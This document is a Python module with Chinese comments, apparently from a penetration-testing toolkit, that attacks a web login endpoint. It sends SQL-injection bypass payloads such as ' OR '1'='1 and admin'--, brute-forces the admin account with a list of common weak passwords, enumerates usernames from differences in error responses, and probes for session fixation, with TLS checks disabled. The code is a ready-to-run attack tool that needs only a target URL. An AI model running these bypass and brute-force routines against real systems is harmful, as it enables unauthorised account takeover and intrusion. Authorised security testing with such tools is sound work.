"""
认证测试 - 测试认证绕过、暴力破解、用户枚举
输入: {login_url, test_mode, payloads, max_attempts}
输出: {vulnerable, bypass_payload, weak_credential, lockout_detected}
"""

import requests
import time
import json

requests.packages.urllib3.disable_warnings()


# 认证绕过Payload
AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin123"},
    {"username": "test", "password": "test"},
    {"username": "' OR '1'='1", "password": "any"},
    {"username": "admin'--", "password": "any"},
    {"username": "1' OR '1'='1", "password": "1"},
]

# 弱密码
WEAK_PASSWORDS = [
    "123456", "password", "admin", "admin123",
    "123123", "000000", "111111", "12345678",
    "qwerty", "abc123", "1234", "12345"
]


def auth_tester(config):
    """
    测试认证安全
    
    输入:
        login_url: string - 登录接口URL
        test_mode: "sqli" | "bypass" | "bruteforce" | "enum"
        payloads?: object[] - 自定义payload
        max_attempts?: number - 最大尝试次数
    
    输出:
        vulnerable: boolean
        bypass_payload?: object
        weak_credential?: {user, pass}
        lockout_detected: boolean
    """
    login_url = config.get('login_url')
    test_mode = config.get('test_mode', 'bypass')
    payloads = config.get('payloads', AUTH_BYPASS_PAYLOADS)
    max_attempts = config.get('max_attempts', 10)
    
    result = {
        'vulnerable': False,
        'bypass_payload': None,
        'weak_credential': None,
        'lockout_detected': False
    }
    
    if test_mode == 'sqli' or test_mode == 'bypass':
        # SQL注入绕过测试
        sqli_payloads = [p for p in payloads if "'" in str(p.get('username', '')) or "'" in str(p.get('password', ''))]
        
        for payload in sqli_payloads[:5]:
            try:
                resp = requests.post(
                    login_url,
                    json=payload,
                    timeout=5,
                    verify=False,
                    headers={'Content-Type': 'application/json'}
                )
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        # 检查是否登录成功
                        if data.get('success') == True or data.get('code') == 0:
                            if data.get('token') or data.get('data', {}).get('token'):
                                result['vulnerable'] = True
                                result['bypass_payload'] = payload
                                return result
                    except:
                        pass
            except:
                pass
    
    if test_mode == 'bruteforce' or test_mode == 'bypass':
        # 暴力破解测试
        lockout_detected = False
        attempts_before_lockout = 0
        
        for i, pwd in enumerate(WEAK_PASSWORDS[:max_attempts]):
            try:
                resp = requests.post(
                    login_url,
                    json={"username": "admin", "password": pwd},
                    timeout=3,
                    verify=False,
                    headers={'Content-Type': 'application/json'}
                )
                
                attempts_before_lockout += 1
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data.get('success') == True or data.get('code') == 0:
                            result['vulnerable'] = True
                            result['weak_credential'] = {"user": "admin", "pass": pwd}
                            return result
                    except:
                        pass
                
                # 检查是否被锁定
                if resp.status_code == 429 or 'lock' in resp.text.lower():
                    lockout_detected = True
                
                time.sleep(0.5)  # 避免过快请求
                
            except:
                pass
        
        result['lockout_detected'] = lockout_detected
        result['attempts_before_lockout'] = attempts_before_lockout
    
    if test_mode == 'enum':
        # 用户枚举测试
        error_responses = {}
        
        test_users = [
            "admin", "test", "user", "administrator",
            "root", "guest", "nonexistent_user_12345"
        ]
        
        for user in test_users:
            try:
                resp = requests.post(
                    login_url,
                    json={"username": user, "password": "wrongpwd"},
                    timeout=5,
                    verify=False,
                    headers={'Content-Type': 'application/json'}
                )
                
                if resp.status_code == 200:
                    body = str(resp.json())
                    error_responses[user] = body
                
                time.sleep(0.3)
            except:
                pass
        
        # 分析响应差异
        unique_responses = set(error_responses.values())
        if len(unique_responses) > 1:
            # 存在响应差异，可能可以枚举用户
            result['vulnerable'] = True
            result['enum_possible'] = True
            result['response_patterns'] = len(unique_responses)
    
    return result


def test_session_fixation(login_url):
    """
    测试会话固定攻击
    
    输入:
        login_url: string
    
    输出:
        vulnerable: boolean
        fixation_detected: boolean
    """
    # 生成测试session
    test_session = "test_session_12345"
    
    # 使用测试session访问登录页
    try:
        resp1 = requests.get(login_url, timeout=5, verify=False)
        
        # 登录（使用测试session）
        login_data = {
            "username": "test",
            "password": "test",
            "session": test_session
        }
        resp2 = requests.post(
            login_url,
            json=login_data,
            timeout=5,
            verify=False,
            cookies={'JSESSIONID': test_session}
        )
        
        # 登录后session应该改变
        if 'set-cookie' in resp2.headers:
            set_cookie = resp2.headers['set-cookie'].lower()
            if test_session in set_cookie:
                return {
                    'vulnerable': True,
                    'fixation_detected': True,
                    'reason': 'Session未在登录后改变'
                }
        
    except:
        pass
    
    return {
        'vulnerable': False,
        'fixation_detected': False
    }


def check_error_difference(login_url):
    """
    检查登录错误响应差异（用于用户枚举）
    
    输入:
        login_url: string
    
    输出:
        has_difference: boolean
        patterns: number
    """
    test_cases = [
        {"username": "admin", "password": "wrong"},
        {"username": "nonexist", "password": "wrong"},
        {"username": "test", "password": "wrong"},
    ]
    
    responses = []
    
    for case in test_cases:
        try:
            resp = requests.post(
                login_url,
                json=case,
                timeout=5,
                verify=False,
                headers={'Content-Type': 'application/json'}
            )
            responses.append(str(resp.json()))
        except:
            responses.append("error")
    
    unique = set(responses)
    
    return {
        'has_difference': len(unique) > 1,
        'patterns': len(unique),
        'responses': responses
    }


if __name__ == '__main__':
    # 测试
    result = auth_tester({
        'login_url': 'http://example.com/api/login',
        'test_mode': 'bypass'
    })
    print(f"Vulnerable: {result['vulnerable']}")
